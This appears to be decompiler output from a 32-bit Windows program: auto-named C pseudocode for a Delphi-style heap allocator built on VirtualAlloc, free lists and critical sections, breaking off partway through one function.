char byte_41E6D9[2047]; // weak
int dword_41EED8; // weak
int dword_41EEDC; // weak
int dword_41EEE0; // weak
int dword_41EEE4; // weak
int dword_41EEE8; // weak
int dword_41EEEC; // weak
int dword_41EEF0; // weak
int dword_41EEF4; // weak
int dword_41EEF8; // weak
int dword_41EEFC; // weak
int dword_41EF00; // weak
int dword_41EF04; // weak
int dword_41EF08; // weak
int dword_41EF0C; // weak
int dword_41EF10; // weak
int dword_41EF14; // weak
int dword_41EF18; // weak
int dword_41EF1C; // weak
char byte_41EF20; // weak
char byte_41EF21; // weak


//----- (00401214) --------------------------------------------------------
int sub_401214()
{
  int v0; // ebx
  struct _STARTUPINFOA v2; // [esp+0h] [ebp-48h] BYREF

  v0 = 10;
  GetStartupInfoA(&v2);
  if ( (v2.dwFlags & 1) != 0 )
    return v2.wShowWindow;
  return v0;
}

//----- (00401278) --------------------------------------------------------
int sub_401278()
{
  _DWORD *v0; // ecx
  int result; // eax
  int i; // edx

  if ( !dword_41E44C )
  {
    v0 = LocalAlloc(0, 0x644u);
    if ( !v0 )
      return 0;
    *v0 = dword_41E448;
    dword_41E448 = v0;
    for ( i = 0; i != 100; ++i )
    {
      v0[4 * i + 1] = dword_41E44C;
      dword_41E44C = (int)&v0[4 * i + 1];
    }
  }
  result = dword_41E44C;
  dword_41E44C = *(_DWORD *)dword_41E44C;
  return result;
}
// 41E44C: using guessed type int dword_41E44C;

//----- (004012C8) --------------------------------------------------------
_DWORD *__usercall sub_4012C8@<eax>(_DWORD *result@<eax>)
{
  *result = result;
  result[1] = result;
  return result;
}

//----- (004012D0) --------------------------------------------------------
char __usercall sub_4012D0@<al>(int *a1@<eax>, int *a2@<edx>)
{
  int *v4; // eax
  int v6; // edx

  v4 = (int *)sub_401278();
  if ( !v4 )
    return 0;
  v4[2] = *a2;
  v4[3] = a2[1];
  v6 = *a1;
  *v4 = *a1;
  v4[1] = (int)a1;
  *(_DWORD *)(v6 + 4) = v4;
  *a1 = (int)v4;
  return 1;
}

//----- (00401300) --------------------------------------------------------
int *__usercall sub_401300@<eax>(int *result@<eax>)
{
  int *v1; // edx
  int v2; // ecx

  v1 = (int *)result[1];
  v2 = *result;
  *v1 = *result;
  *(_DWORD *)(v2 + 4) = v1;
  *result = dword_41E44C;
  dword_41E44C = (int)result;
  return result;
}
// 41E44C: using guessed type int dword_41E44C;

//----- (00401318) --------------------------------------------------------
char __usercall sub_401318@<al>(int *a1@<eax>, int *a2@<edx>, int *a3@<ecx>)
{
  int *v5; // ebx
  int *v6; // edi
  char result; // al

  v5 = (int *)*a1;
  *a3 = *a2;
  a3[1] = a2[1];
  do
  {
    v6 = (int *)*v5;
    if ( v5[3] + v5[2] == *a3 )
    {
      sub_401300(v5);
      *a3 = v5[2];
      a3[1] += v5[3];
    }
    else if ( v5[2] == a3[1] + *a3 )
    {
      sub_401300(v5);
      a3[1] += v5[3];
    }
    v5 = v6;
  }
  while ( a1 != v6 );
  result = sub_4012D0(a1, a3);
  if ( !result )
  {
    result = 0;
    *a3 = 0;
  }
  return result;
}

//----- (0040138C) --------------------------------------------------------
int *__usercall sub_40138C@<eax>(int *a1@<eax>, int **a2@<edx>)
{
  int *v2; // ebx
  int *v4; // esi
  int *result; // eax
  int *v6; // esi
  int *v7; // edi
  int v8[6]; // [esp+0h] [ebp-18h] BYREF

  v2 = a1;
  while ( 1 )
  {
    v4 = *a2;
    result = (int *)v2[2];
    if ( *a2 >= result && (char *)v4 + (int)a2[1] <= (char *)result + v2[3] )
      break;
    v2 = (int *)*v2;
    if ( a1 == v2 )
      return 0;
  }
  if ( v4 == result )
  {
    v2[2] += (int)a2[1];
    result = a2[1];
    v2[3] -= (int)result;
    if ( !v2[3] )
      result = sub_401300(v2);
  }
  else
  {
    v6 = a2[1];
    v7 = (int *)((char *)result + v2[3]);
    if ( (int *)((char *)*a2 + (_DWORD)v6) == v7 )
    {
      v2[3] -= (int)v6;
    }
    else
    {
      v8[0] = (int)*a2 + (_DWORD)a2[1];
      v8[1] = (int)v7 - v8[0];
      v2[3] = (char *)*a2 - (char *)result;
      if ( !sub_4012D0(v2, v8) )
        return 0;
    }
  }
  LOBYTE(result) = 1;
  return result;
}

//----- (0040141C) --------------------------------------------------------
char __usercall sub_40141C@<al>(int a1@<eax>, int *a2@<edx>)
{
  unsigned int v3; // esi
  LPVOID v4; // eax

  if ( a1 >= 0x100000 )
    v3 = (a1 + 0xFFFF) & 0xFFFF0000;
  else
    v3 = 0x100000;
  a2[1] = v3;
  v4 = VirtualAlloc(0, v3, 0x2000u, 1u);
  *a2 = (int)v4;
  if ( v4 )
  {
    LOBYTE(v4) = sub_4012D0(&dword_41E450, a2);
    if ( !(_BYTE)v4 )
    {
      VirtualFree((LPVOID)*a2, 0, 0x8000u);
      LOBYTE(v4) = 0;
      *a2 = 0;
    }
  }
  return (char)v4;
}
// 41E450: using guessed type int dword_41E450;

//----- (00401480) --------------------------------------------------------
char __usercall sub_401480@<al>(void *a1@<eax>, int a2@<edx>, int *a3@<ecx>)
{
  LPVOID v6; // eax
  unsigned int v7; // esi

  a3[1] = 0x100000;
  v6 = VirtualAlloc(a1, 0x100000u, 0x2000u, 4u);
  *a3 = (int)v6;
  if ( !v6 )
  {
    v7 = (a2 + 0xFFFF) & 0xFFFF0000;
    a3[1] = v7;
    v6 = VirtualAlloc(a1, v7, 0x2000u, 4u);
    *a3 = (int)v6;
  }
  if ( *a3 )
  {
    LOBYTE(v6) = sub_4012D0(&dword_41E450, a3);
    if ( !(_BYTE)v6 )
    {
      VirtualFree((LPVOID)*a3, 0, 0x8000u);
      LOBYTE(v6) = 0;
      *a3 = 0;
    }
  }
  return (char)v6;
}
// 41E450: using guessed type int dword_41E450;

//----- (004014F8) --------------------------------------------------------
unsigned int *__usercall sub_4014F8@<eax>(unsigned int a1@<eax>, int a2@<edx>, unsigned int *a3@<ecx>)
{
  int *i; // ebx
  int v5; // edi
  void *v6; // esi
  unsigned int *result; // eax
  unsigned int v9; // [esp+8h] [ebp-1Ch]
  unsigned int v10; // [esp+Ch] [ebp-18h]
  unsigned int v11; // [esp+10h] [ebp-14h]

  v9 = -1;
  v10 = 0;
  v11 = a1 + a2;
  for ( i = (int *)dword_41E450; i != &dword_41E450; i = (int *)v5 )
  {
    v5 = *i;
    v6 = (void *)i[2];
    if ( a1 <= (unsigned int)v6 && (unsigned int)v6 + i[3] <= v11 )
    {
      if ( (unsigned int)v6 < v9 )
        v9 = i[2];
      if ( (unsigned int)v6 + i[3] > v10 )
        v10 = (unsigned int)v6 + i[3];
      if ( !VirtualFree(v6, 0, 0x8000u) )
        dword_41E42C = 1;
      sub_401300(i);
    }
  }
  result = a3;
  *a3 = 0;
  if ( v10 )
  {
    *a3 = v9;
    result = (unsigned int *)(v10 - v9);
    a3[1] = v10 - v9;
  }
  return result;
}
// 41E42C: using guessed type int dword_41E42C;
// 41E450: using guessed type int dword_41E450;

//----- (004015B0) --------------------------------------------------------
LPVOID __usercall sub_4015B0@<eax>(int a1@<eax>, int a2@<edx>, unsigned int *a3@<ecx>)
{
  unsigned int v3; // ebp
  LPVOID result; // eax
  int *i; // esi
  char *v6; // ebx
  char *v7; // edi
  unsigned int v9; // [esp+8h] [ebp-14h]

  v3 = a1 & 0xFFFFF000;
  v9 = (a2 + a1 + 4095) & 0xFFFFF000;
  *a3 = a1 & 0xFFFFF000;
  result = (LPVOID)(v9 - (a1 & 0xFFFFF000));
  a3[1] = (unsigned int)result;
  for ( i = (int *)dword_41E450; i != &dword_41E450; i = (int *)*i )
  {
    v6 = (char *)i[2];
    v7 = &v6[i[3]];
    if ( v3 > (unsigned int)v6 )
      v6 = (char *)v3;
    if ( (unsigned int)v7 > v9 )
      v7 = (char *)v9;
    if ( v7 > v6 )
    {
      result = VirtualAlloc(v6, v7 - v6, 0x1000u, 4u);
      if ( !result )
      {
        result = a3;
        *a3 = 0;
        return result;
      }
    }
  }
  return result;
}
// 41E450: using guessed type int dword_41E450;

//----- (00401644) --------------------------------------------------------
unsigned int __usercall sub_401644@<eax>(int a1@<eax>, int a2@<edx>, unsigned int *a3@<ecx>)
{
  unsigned int v3; // ebp
  unsigned int result; // eax
  int *i; // esi
  char *v6; // ebx
  char *v7; // edi
  unsigned int v8; // [esp+0h] [ebp-14h]

  v8 = (a1 + 4095) & 0xFFFFF000;
  v3 = (a2 + a1) & 0xFFFFF000;
  *a3 = v8;
  result = v3 - v8;
  a3[1] = v3 - v8;
  for ( i = (int *)dword_41E450; i != &dword_41E450; i = (int *)*i )
  {
    v6 = (char *)i[2];
    v7 = &v6[i[3]];
    if ( (unsigned int)v6 < v8 )
      v6 = (char *)v8;
    if ( v3 < (unsigned int)v7 )
      v7 = (char *)v3;
    if ( v7 > v6 )
    {
      result = VirtualFree(v6, v7 - v6, 0x4000u);
      if ( !result )
        dword_41E42C = 2;
    }
  }
  return result;
}
// 41E42C: using guessed type int dword_41E42C;
// 41E450: using guessed type int dword_41E450;

//----- (004016C4) --------------------------------------------------------
int *__usercall sub_4016C4@<eax>(int a1@<eax>, int *a2@<edx>)
{
  int v3; // edi
  int *i; // ebx
  int *result; // eax
  int v6[6]; // [esp+0h] [ebp-18h] BYREF

  v3 = (a1 + 0x3FFF) & 0xFFFFC000;
LABEL_2:
  for ( i = (int *)dword_41E460[0]; ; i = (int *)*i )
  {
    if ( i == dword_41E460 )
    {
      LOBYTE(result) = sub_40141C(v3, a2);
      if ( !*a2 )
        return result;
      sub_401318(dword_41E460, a2, v6);
      if ( !v6[0] )
      {
        sub_4014F8(*a2, a2[1], (unsigned int *)v6);
        result = 0;
        *a2 = 0;
        return result;
      }
      goto LABEL_2;
    }
    if ( v3 <= i[3] )
      break;
  }
  result = (int *)sub_4015B0(i[2], v3, (unsigned int *)a2);
  if ( *a2 )
  {
    i[2] += a2[1];
    result = (int *)a2[1];
    i[3] -= (int)result;
    if ( !i[3] )
      return sub_401300(i);
  }
  return result;
}
// 41E460: using guessed type _DWORD dword_41E460[4];

//----- (00401754) --------------------------------------------------------
int *__usercall sub_401754@<eax>(void *a1@<eax>, int a2@<edx>, unsigned int *a3@<ecx>)
{
  int v4; // edi
  int *i; // ebx
  int *result; // eax
  int v8[2]; // [esp+4h] [ebp-20h] BYREF
  int v9[6]; // [esp+Ch] [ebp-18h] BYREF

  v4 = (a2 + 0x3FFF) & 0xFFFFC000;
  while ( 1 )
  {
    while ( 1 )
    {
      for ( i = (int *)dword_41E460[0]; i != dword_41E460 && a1 != (void *)i[2]; i = (int *)*i )
        ;
      if ( a1 != (void *)i[2] )
        break;
      if ( v4 <= i[3] )
        goto LABEL_14;
      sub_401480((void *)(i[3] + i[2]), v4 - i[3], v8);
      if ( !v8[0] )
        break;
      sub_401318(dword_41E460, v8, v9);
      if ( !v9[0] )
        goto LABEL_10;
    }
    sub_401480(a1, v4, v8);
    if ( !v8[0] )
      break;
    sub_401318(dword_41E460, v8, v9);
    if ( !v9[0] )
    {
LABEL_10:
      sub_4014F8(v8[0], v8[1], (unsigned int *)v9);
      result = (int *)a3;
      *a3 = 0;
      return result;
    }
  }
LABEL_14:
  if ( a1 == (void *)i[2] && v4 <= i[3] )
  {
    sub_4015B0(i[2], v4, a3);
    result = (int *)a3;
    if ( *a3 )
    {
      i[2] += a3[1];
      result = (int *)a3[1];
      i[3] -= (int)result;
      if ( !i[3] )
        return sub_401300(i);
    }
  }
  else
  {
    result = (int *)a3;
    *a3 = 0;
  }
  return result;
}
// 41E460: using guessed type _DWORD dword_41E460[4];

//----- (00401878) --------------------------------------------------------
char __usercall sub_401878@<al>(int a1@<eax>, int a2@<edx>, unsigned int *a3@<ecx>)
{
  unsigned int v4; // ebx
  unsigned int v5; // esi
  char result; // al
  int *v7; // [esp+4h] [ebp-1Ch] BYREF
  int v8; // [esp+8h] [ebp-18h]
  int *v9; // [esp+Ch] [ebp-14h] BYREF
  int v10; // [esp+10h] [ebp-10h]

  v4 = (a1 + 0x3FFF) & 0xFFFFC000;
  v5 = (a1 + a2) & 0xFFFFC000;
  if ( v4 >= v5 )
  {
    result = 0;
    *a3 = 0;
  }
  else
  {
    sub_401644((a1 + 0x3FFF) & 0xFFFFC000, v5 - v4, a3);
    result = sub_401318(dword_41E460, (int *)a3, (int *)&v7);
    if ( v7 )
    {
      sub_4014F8((unsigned int)v7, v8, (unsigned int *)&v9);
      v7 = v9;
      result = v10;
      v8 = v10;
    }
    if ( v7 )
      return (unsigned __int8)sub_40138C(dword_41E460, &v7);
  }
  return result;
}
// 41E460: using guessed type _DWORD dword_41E460[4];

//----- (00401904) --------------------------------------------------------
char sub_401904()
{
  int i; // eax
  unsigned int v2[2]; // [esp-Ch] [ebp-Ch] BYREF
  int *v3; // [esp-4h] [ebp-4h]
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v3 = &savedregs;
  v2[1] = (unsigned int)&loc_4019BA;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  InitializeCriticalSection(&CriticalSection);
  if ( byte_41E041 )
    EnterCriticalSection(&CriticalSection);
  sub_4012C8(&dword_41E450);
  sub_4012C8(dword_41E460);
  sub_4012C8(dword_41E48C);
  hMem = LocalAlloc(0, 0xFF8u);
  if ( hMem )
  {
    for ( i = 3; i != 1025; ++i )
      *((_DWORD *)hMem + i - 3) = 0;
    *((_DWORD *)&unk_41E470 + 1) = &unk_41E470;
    unk_41E470 = &unk_41E470;
    dword_41E47C = (int)&unk_41E470;
    byte_41E428 = 1;
  }
  __writefsdword(0, v2[0]);
  v3 = (int *)&loc_4019C1;
  if ( byte_41E041 )
    LeaveCriticalSection(&CriticalSection);
  return byte_41E428;
}
// 41E041: using guessed type char byte_41E041;
// 41E428: using guessed type char byte_41E428;
// 41E450: using guessed type int dword_41E450;
// 41E460: using guessed type _DWORD dword_41E460[4];
// 41E47C: using guessed type int dword_41E47C;
// 41E48C: using guessed type int dword_41E48C[4];

//----- (004019C8) --------------------------------------------------------
void sub_4019C8()
{
  int i; // ebx
  HLOCAL *j; // eax
  unsigned int v2[2]; // [esp-Ch] [ebp-10h] BYREF
  int *v3; // [esp-4h] [ebp-8h]
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  if ( byte_41E428 )
  {
    v3 = &savedregs;
    v2[1] = (unsigned int)&loc_401A9E;
    v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v2);
    if ( byte_41E041 )
      EnterCriticalSection(&CriticalSection);
    byte_41E428 = 0;
    LocalFree(hMem);
    hMem = 0;
    for ( i = dword_41E450; (int *)i != &dword_41E450; i = *(_DWORD *)i )
      VirtualFree(*(LPVOID *)(i + 8), 0, 0x8000u);
    sub_4012C8(&dword_41E450);
    sub_4012C8(dword_41E460);
    sub_4012C8(dword_41E48C);
    for ( j = (HLOCAL *)dword_41E448; dword_41E448; j = (HLOCAL *)dword_41E448 )
    {
      dword_41E448 = *j;
      LocalFree(j);
    }
    __writefsdword(0, v2[0]);
    v3 = (int *)&loc_401AA5;
    if ( byte_41E041 )
      LeaveCriticalSection(&CriticalSection);
    DeleteCriticalSection(&CriticalSection);
  }
}
// 41E041: using guessed type char byte_41E041;
// 41E428: using guessed type char byte_41E428;
// 41E450: using guessed type int dword_41E450;
// 41E460: using guessed type _DWORD dword_41E460[4];
// 41E48C: using guessed type int dword_41E48C[4];

//----- (00401AA8) --------------------------------------------------------
_DWORD *__usercall sub_401AA8@<eax>(_DWORD *a1@<eax>)
{
  _DWORD *v1; // edx
  int v2; // ecx
  int v3; // kr00_4
  _DWORD *result; // eax

  if ( a1 == (_DWORD *)dword_41E47C )
    dword_41E47C = a1[1];
  v1 = (_DWORD *)a1[1];
  v2 = a1[2];
  if ( v2 > 4096 )
  {
    result = (_DWORD *)*a1;
    *v1 = result;
    result[1] = v1;
  }
  else if ( a1 == v1 )
  {
    v3 = a1[2];
    result = hMem;
    *((_DWORD *)hMem + v3 / 4 - 3) = 0;
  }
  else
  {
    *((_DWORD *)hMem + a1[2] / 4 - 3) = v1;
    result = (_DWORD *)*a1;
    *v1 = result;
    result[1] = v1;
  }
  return result;
}
// 41E47C: using guessed type int dword_41E47C;

//----- (00401B0C) --------------------------------------------------------
int *__usercall sub_401B0C@<eax>(unsigned int a1@<eax>)
{
  int *i; // edx
  unsigned int v2; // ecx

  for ( i = (int *)dword_41E48C[0]; i != dword_41E48C; i = (int *)*i )
  {
    v2 = i[2];
    if ( a1 >= v2 && a1 < i[3] + v2 )
      return i;
  }
  dword_41E42C = 3;
  return 0;
}
// 41E42C: using guessed type int dword_41E42C;
// 41E48C: using guessed type int dword_41E48C[4];

//----- (00401B3C) --------------------------------------------------------
unsigned int *__usercall sub_401B3C@<eax>(unsigned int *result@<eax>, int a2@<edx>)
{
  unsigned int *v2; // ebx

  v2 = (unsigned int *)((char *)result + a2 - 4);
  if ( a2 < 16 )
  {
    if ( a2 >= 4 )
    {
      *result = a2 | 0x80000002;
      *v2 = a2 | 0x80000002;
    }
  }
  else
  {
    *v2 = -2147483641;
    return sub_401CF8(result, a2 - 4);
  }
  return result;
}

//----- (00401B6C) --------------------------------------------------------
int __usercall sub_401B6C@<eax>(int a1@<eax>)
{
  ++dword_41E41C;
  dword_41E420 += (*(_DWORD *)(a1 - 4) & 0x7FFFFFFC) - 4;
  return sub_402160(a1);
}
// 41E41C: using guessed type int dword_41E41C;
// 41E420: using guessed type int dword_41E420;

//----- (00401B90) --------------------------------------------------------
_DWORD *__usercall sub_401B90@<eax>(_DWORD *a1@<eax>, int a2@<edx>)
{
  _DWORD *result; // eax

  if ( a2 < 12 )
  {
    if ( a2 >= 4 )
      *a1 = a2 | 0x80000002;
    result = (_DWORD *)((char *)a1 + a2);
    *result &= ~1u;
  }
  else
  {
    *a1 = a2 | 2;
    return (_DWORD *)sub_401B6C((int)(a1 + 1));
  }
  return result;
}

//----- (00401BB8) --------------------------------------------------------
int __usercall sub_401BB8@<eax>(int a1@<eax>)
{
  int v1; // edx
  int v2; // ebx
  _DWORD *v3; // eax
  int v4; // esi
  _DWORD *v5; // eax

  v1 = *(_DWORD *)(a1 - 4);
  if ( (v1 & 0x80000002) != -2147483646 )
    dword_41E42C = 4;
  v2 = v1 & 0x7FFFFFFC;
  v3 = (_DWORD *)(a1 - (v1 & 0x7FFFFFFC));
  if ( ((*v3 ^ v1) & 0xFFFFFFFE) != 0 )
    dword_41E42C = 5;
  if ( (*(_BYTE *)v3 & 1) != 0 )
  {
    v4 = *(v3 - 1);
    v5 = (_DWORD *)((char *)v3 - v4);
    if ( v4 != v5[2] )
      dword_41E42C = 6;
    sub_401AA8(v5);
    v2 += v4;
  }
  return v2;
}
// 41E42C: using guessed type int dword_41E42C;

//----- (00401C28) --------------------------------------------------------
int __usercall sub_401C28@<eax>(int *a1@<eax>)
{
  int *v1; // ebx
  int v2; // edi
  int v3; // eax
  int v4; // eax

  v1 = a1;
  v2 = 0;
  v3 = *a1;
  if ( v3 < 0 )
  {
    v2 = v3 & 0x7FFFFFFC;
    v1 = (int *)((char *)v1 + (v3 & 0x7FFFFFFC));
    v3 = *v1;
  }
  if ( (v3 & 2) == 0 )
  {
    sub_401AA8(v1);
    v4 = v1[2];
    v2 += v4;
    *(int *)((char *)v1 + v4) &= ~1u;
  }
  return v2;
}

//----- (00401C60) --------------------------------------------------------
int *__usercall sub_401C60@<eax>(unsigned int *a1@<eax>, int a2@<edx>)
{
  int *v4; // ebx
  int v5; // ebp
  int v6; // eax
  char *v7; // ebp
  int *result; // eax
  char *v9; // [esp+0h] [ebp-18h] BYREF
  int v10; // [esp+4h] [ebp-14h]

  v4 = sub_401B0C((unsigned int)a1);
  v5 = v4[2];
  v6 = v4[3] + v5;
  if ( v6 - ((int)a1 + a2) <= 12 )
    a2 = v6 - (_DWORD)a1;
  if ( (int)a1 - v5 >= 12 )
    sub_401878((int)(a1 + 1), a2 - 4, (unsigned int *)&v9);
  else
    sub_401878(v5, (int)a1 + a2 - v4[2], (unsigned int *)&v9);
  v7 = v9;
  if ( !v9 )
    return 0;
  sub_401B3C(a1, v9 - (char *)a1);
  if ( (unsigned int)&v7[v10] < v4[3] + v4[2] )
    sub_401B90(&v7[v10], (char *)a1 + a2 - &v7[v10]);
  result = sub_40138C(v4, (int **)&v9);
  LOBYTE(result) = 1;
  return result;
}

//----- (00401CF8) --------------------------------------------------------
unsigned int *__usercall sub_401CF8@<eax>(unsigned int *a1@<eax>, int a2@<edx>)
{
  int v3; // edx
  unsigned int *result; // eax
  unsigned int v5; // edx
  unsigned int v6; // edx

  a1[2] = a2;
  *(unsigned int *)((char *)a1 + a2 - 4) = a2;
  if ( a2 > 4096 )
  {
    if ( a2 < 15360 || (result = (unsigned int *)sub_401C60(a1, a2), !(_BYTE)result) )
    {
      result = (unsigned int *)dword_41E47C;
      dword_41E47C = (int)a1;
      v6 = *result;
      a1[1] = (unsigned int)result;
      *a1 = v6;
      *result = (unsigned int)a1;
      *(_DWORD *)(v6 + 4) = a1;
    }
  }
  else
  {
    v3 = a2 / 4;
    result = (unsigned int *)*((_DWORD *)hMem + v3 - 3);
    if ( result )
    {
      v5 = *result;
      a1[1] = (unsigned int)result;
      *a1 = v5;
      *result = (unsigned int)a1;
      *(_DWORD *)(v5 + 4) = a1;
    }
    else
    {
      result = (unsigned int *)hMem;
      *((_DWORD *)hMem + v3 - 3) = a1;
      a1[1] = (unsigned int)a1;
      *a1 = (unsigned int)a1;
    }
  }
  return result;
}
// 41E47C: using guessed type int dword_41E47C;

//----- (00401D80) --------------------------------------------------------
int sub_401D80()
{
  int result; // eax

  if ( dword_41E480 > 0 )
  {
    if ( dword_41E480 >= 12 )
    {
      *(_DWORD *)dword_41E484 = dword_41E480 | 2;
      sub_401B6C(dword_41E484 + 4);
      dword_41E484 = 0;
      result = 0;
      dword_41E480 = 0;
    }
    else
    {
      dword_41E42C = 7;
    }
  }
  return result;
}
// 41E42C: using guessed type int dword_41E42C;
// 41E480: using guessed type int dword_41E480;
// 41E484: using guessed type int dword_41E484;

//----- (00401DCC) --------------------------------------------------------
char __usercall sub_401DCC@<al>(unsigned int *a1@<eax>)
{
  unsigned int v1; // ebx
  int v3; // eax
  int v4; // esi
  int v5; // eax
  unsigned int v6; // [esp+0h] [ebp-1Ch] BYREF
  unsigned int v7; // [esp+4h] [ebp-18h]
  unsigned int v8; // [esp+8h] [ebp-14h] BYREF
  int v9; // [esp+Ch] [ebp-10h]

  v6 = *a1;
  v7 = a1[1];
  sub_401D80();
  sub_401318(dword_41E48C, (int *)&v6, (int *)&v8);
  v1 = v8;
  if ( !v8 )
    return 0;
  if ( v8 < v6 )
  {
    v3 = sub_401BB8(v6);
    v6 -= v3;
    v7 += v3;
  }
  v4 = v9 + v1;
  if ( v7 + v6 < v9 + v1 )
  {
    v5 = sub_401C28((int *)(v7 + v6));
    v7 += v5;
  }
  if ( v4 == v7 + v6 )
  {
    sub_401B3C((unsigned int *)(v7 + v6 - 4), 4);
    v7 -= 4;
  }
  dword_41E484 = v6;
  dword_41E480 = v7;
  return 1;
}
// 41E480: using guessed type int dword_41E480;
// 41E484: using guessed type int dword_41E484;
// 41E48C: using guessed type int dword_41E48C[4];

//----- (00401E58) --------------------------------------------------------
int __usercall sub_401E58@<eax>(int a1@<eax>)
{
  int result; // eax
  int v2[3]; // [esp+0h] [ebp-Ch] BYREF

  sub_4016C4(a1 + 4, v2);
  if ( !v2[0] || !sub_401DCC((unsigned int *)v2) )
    return 0;
  LOBYTE(result) = 1;
  return result;
}

//----- (00401E84) --------------------------------------------------------
int __usercall sub_401E84@<eax>(void *a1@<eax>, int a2@<edx>)
{
  int result; // eax
  unsigned int v3[4]; // [esp+0h] [ebp-10h] BYREF

  sub_401754(a1, a2 + 4, v3);
  if ( !v3[0] || !sub_401DCC(v3) )
    return 0;
  LOBYTE(result) = 1;
  return result;
}

//----- (00401EB8) --------------------------------------------------------
int __usercall sub_401EB8@<eax>(int a1@<eax>)
{
  int v1; // edx
  int v2; // eax

  v1 = 0;
  v2 = a1 / 4;
  if ( v2 <= 1024 )
  {
    do
    {
      v1 = *((_DWORD *)hMem + v2 - 3);
      if ( v1 )
        break;
      ++v2;
    }
    while ( v2 != 1025 );
  }
  return v1;
}

//----- (00401EE4) --------------------------------------------------------
_DWORD *__usercall sub_401EE4@<eax>(int a1@<eax>)
{
  int *v2; // ebx
  int v3; // eax
  _DWORD *result; // eax
  int *v5; // eax
  int v6; // edx

  do
  {
    v2 = (int *)dword_41E474;
    if ( a1 <= *(_DWORD *)(dword_41E474 + 8) )
      goto LABEL_15;
    v2 = (int *)dword_41E47C;
    v3 = *(_DWORD *)(dword_41E47C + 8);
    if ( a1 <= v3 )
      goto LABEL_15;
    *(_DWORD *)(dword_41E47C + 8) = a1;
    do
      v2 = (int *)v2[1];
    while ( a1 > v2[2] );
    *(_DWORD *)(dword_41E47C + 8) = v3;
    if ( v2 != (int *)dword_41E47C )
    {
      dword_41E47C = (int)v2;
LABEL_15:
      sub_401AA8(v2);
      if ( v2[2] - a1 < 12 )
      {
        v6 = v2[2];
        a1 = v6;
        if ( v2 == (int *)dword_41E47C )
          dword_41E47C = v2[1];
        *(int *)((char *)v2 + v6) &= ~1u;
      }
      else
      {
        sub_401CF8((unsigned int *)((char *)v2 + a1), v2[2] - a1);
      }
      *v2 = a1 | 2;
      result = v2 + 1;
      ++dword_41E41C;
      dword_41E420 += a1 - 4;
      return result;
    }
    if ( a1 <= 4096 )
    {
      v2 = (int *)sub_401EB8(a1);
      if ( v2 )
        goto LABEL_15;
    }
    if ( !(unsigned __int8)sub_401E58(a1) )
      return 0;
  }
  while ( a1 > dword_41E480 );
  dword_41E480 -= a1;
  if ( dword_41E480 < 12 )
  {
    a1 += dword_41E480;
    dword_41E480 = 0;
  }
  v5 = (int *)dword_41E484;
  dword_41E484 += a1;
  *v5 = a1 | 2;
  result = v5 + 1;
  ++dword_41E41C;
  dword_41E420 += a1 - 4;
  return result;
}
// 41E41C: using guessed type int dword_41E41C;
// 41E420: using guessed type int dword_41E420;
// 41E474: using guessed type int dword_41E474;
// 41E47C: using guessed type int dword_41E47C;
// 41E480: using guessed type int dword_41E480;
// 41E484: using guessed type int dword_41E484;

//----- (00401FD8) --------------------------------------------------------
_DWORD *__usercall sub_401FD8@<eax>(int a1@<eax>)
{
  int v2; // ebx
  int *v3; // edx
  int *v4; // esi
  int *v5; // eax
  int *v6; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-20h] BYREF
  void *v9; // [esp-8h] [ebp-1Ch]
  int *v10; // [esp-4h] [ebp-18h]
  int v11; // [esp+Ch] [ebp-8h]
  _DWORD *v12; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  if ( !byte_41E428 && !sub_401904() )
    return 0;
  v10 = &savedregs;
  v9 = &loc_40214C;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( byte_41E041 )
    EnterCriticalSection(&CriticalSection);
  v2 = (a1 + 7) & 0xFFFFFFFC;
  if ( v2 < 12 )
    v2 = 12;
  if ( v2 <= 4096 && (v3 = (int *)*((_DWORD *)hMem + (v2 >> 2) - 3)) != 0 )
  {
    v4 = (int *)*((_DWORD *)hMem + (v2 >> 2) - 3);
    *(int *)((char *)v3 + v2) &= ~1u;
    v5 = (int *)v3[1];
    if ( v3 == v5 )
    {
      *((_DWORD *)hMem + (v2 >> 2) - 3) = 0;
    }
    else
    {
      *((_DWORD *)hMem + (v2 >> 2) - 3) = v5;
      v11 = *v3;
      *(_DWORD *)(v11 + 4) = v5;
      *v5 = v11;
    }
    *v4 = v3[2] | 2;
    v12 = v4 + 1;
    ++dword_41E41C;
    dword_41E420 += v2 - 4;
    sub_403038((unsigned int)ExceptionList, (int)v9, (int)v10);
  }
  else if ( v2 > dword_41E480 )
  {
    v12 = sub_401EE4(v2);
    __writefsdword(0, (unsigned int)ExceptionList);
    v10 = (int *)&loc_402153;
    if ( byte_41E041 )
      LeaveCriticalSection(&CriticalSection);
  }
  else
  {
    dword_41E480 -= v2;
    if ( dword_41E480 < 12 )
    {
      v2 += dword_41E480;
      dword_41E480 = 0;
    }
    v6 = (int *)dword_41E484;
    dword_41E484 += v2;
    *v6 = v2 | 2;
    v12 = v6 + 1;
    ++dword_41E41C;
    dword_41E420 += v2 - 4;
    sub_403038((unsigned int)ExceptionList, (int)v9, (int)v10);
  }
  return v12;
}
// 402040: conditional instruction was optimized away because ebx.4 is in (C..1000)
// 40206A: conditional instruction was optimized away because ebx.4 is in (C..1000)
// 402084: conditional instruction was optimized away because ebx.4 is in (C..1000)
// 41E041: using guessed type char byte_41E041;
// 41E41C: using guessed type int dword_41E41C;
// 41E420: using guessed type int dword_41E420;
// 41E428: using guessed type char byte_41E428;
// 41E480: using guessed type int dword_41E480;
// 41E484: using guessed type int dword_41E484;

//----- (00402160) --------------------------------------------------------
int __usercall sub_402160@<eax>(int a1@<eax>)
{
  unsigned int *v2; // esi
  int v3; // ebx
  int v4; // edx
  _DWORD *v5; // eax
  int v6; // ebx
  _DWORD *v7; // eax
  _DWORD *v8; // edi
  _DWORD *v9; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-1Ch] BYREF
  void *v12; // [esp-8h] [ebp-18h]
  int *v13; // [esp-4h] [ebp-14h]
  int v14; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  dword_41E42C = 0;
  if ( !byte_41E428 && !sub_401904() )
  {
    dword_41E42C = 8;
    return 8;
  }
